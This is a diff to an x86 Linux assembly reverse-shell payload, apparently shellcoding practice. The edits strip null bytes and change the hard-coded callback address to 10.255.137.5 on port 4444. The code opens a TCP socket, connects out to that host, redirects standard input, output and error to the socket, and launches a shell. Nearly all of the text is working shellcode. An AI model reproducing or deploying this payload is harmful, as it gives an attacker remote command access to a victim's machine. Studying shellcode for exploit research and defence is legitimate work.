@@ -26,9 +26,9 @@ _start:
 
 	xor eax, eax		; zero out eax
 	xor ebx, ebx		; zero out ebx
-	push 0x6		; push parameter 3 TCP Protocol
-	push 0x1		; push parameter 2 SOCK_STREAM
-	push 0x2		; push parameter 1 
+	push byte 0x6		; push parameter 3 TCP Protocol
+	push byte 0x1		; push parameter 2 SOCK_STREAM
+	push byte 0x2		; push parameter 1 
 	mov al, 0x66		; socketcall syscall
 	mov bl, 0x1		; int socket(int domain, int type, int protocol)
 	mov ecx, esp		; parameters
@@ -55,12 +55,13 @@ connector:
 
 	pop esi			; store IP and PORT in esi
 	xor eax, eax		; clean out eax, remember edi has has sockfd
+	xor ecx, ecx
 	push dword [esi]	; IP onto stack
 	push word [esi +4]	; PORT onto stack
 	mov al, 0x2		; AF_INET IPv4 
 	push ax			; struct is set up
 	mov eax, esp		; store the pointer to a register temporarily
-	push 0x10		; parameter 3 16 bytes in length
+	push byte 0x10		; parameter 3 16 bytes in length
 	push eax		; parameter 2, pointer to struct
 	push edi		; parameter 1, sockfd
 	xor eax, eax		; clean out eax again
@@ -83,10 +84,10 @@ redirect_fd:
 	mov ebx, edi		; sockfd
 	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
 	int 0x80		; call it
-	inc ecx			; 1 for std out
+	mov cl, 0x1		; 1 for std out
 	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
 	int 0x80		; call it
-	inc ecx			; 2 for std error
+	mov cl, 0x2		; 2 for std error
 	mov al, 0x3f		; define __NR_dup2    63 (0x3f)
 	int 0x80		; call it
 
@@ -119,4 +120,5 @@ shell_time:
 ip_port:
 
 	call connector
-	remote: db 0x81,0xfa,0xa8,0xc0,0x5c,0x11	; 192.168.250.129, 4444 see iptohex.py	
+	ip_address:	dd 0x589ff0a		; 10.255.137.5
+	port: 		dw 0x5c11		; 4444 see iptohex.py	
